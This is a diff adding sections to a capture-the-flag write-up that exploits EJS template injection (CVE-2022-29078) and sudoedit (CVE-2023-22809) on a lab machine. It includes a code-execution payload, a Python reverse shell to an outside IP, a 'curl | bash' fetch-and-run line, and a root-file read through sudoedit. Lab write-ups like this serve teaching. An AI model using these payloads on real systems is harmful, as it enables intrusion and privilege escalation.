@@ -70,5 +70,68 @@ The error you're encountering is a common issue with EJS (Embedded JavaScript) t
 
 + We've known the page is using EJS templates and we continue researching the available vulnearbility which can occurs in EJS templates.
 + After researching, we've known EJS has SSTI (Server-Side Template Injection) vulnerability. You have fixed some server-side template injection vulnerabilities recently, such as CVE-2022-29078, CVE-2023-29827.
-+ Searching CVE-2022-29078, we found the Poc to exploit SSTI to RCE [here](https://eslam.io/posts/ejs-server-side-template-injection-rce/) 
++ Searching CVE-2022-29078, we found the Poc to exploit SSTI to RCE [here](https://eslam.io/posts/ejs-server-side-template-injection-rce/).
++ In the Poc, we can confirm the EJS in the page by using parameter `delimiter`:
 
+![alt text](image-7.png)
+
+--> It will disclose the template with tags `<%- include("../components/head"); %>` and  `<%- include("../components/navbar", { logged: true, active: "settings" }); %>`
+because the delimiter is not exists.
+
+### The RCE exploit
++ We've had the payload:
+```
+&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('');s
+```
++ We can't execute payload revershell directly in method `execSync()` so we need to create shell file in the machine and execute through `execSync()`.
+
+```
+$ cat shell.sh 
+#!/bin/sh
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.17.1.235",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+
++ Open the server Python in the machine and run the payload:
+
+![alt text](image-8.png)
+
+![alt text](image-9.png)
+
+```
+$ curl <IP> | bash
+1.The curl <IP> part retrieves content from a web server at the specified IP address.
+2.The pipe (|) takes the output from curl and passes it as input to bash.
+3.Bash then executes whatever code was retrieved by curl.
+```
+
+### Privileged Escalation
++ Checking `sudo -l`:
+
+```
+web@cyprusbank:~$ sudo -l
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+--> We can run command `sudoedit` without password.
+
++ Checking version of `sudoedit`:
+
+![alt text](image-10.png)
+
++ Research the Sudo version 1.9.12p1 and we've found the way to privileged escalation with CVE-2023-22809.
++ ### [CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
++ Poc: 
+```
+web@cyprusbank:~$ EDITOR='vim -- /root/root.txt' sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+![alt text](image-11.png)
+
+------------------------------------------------------------------
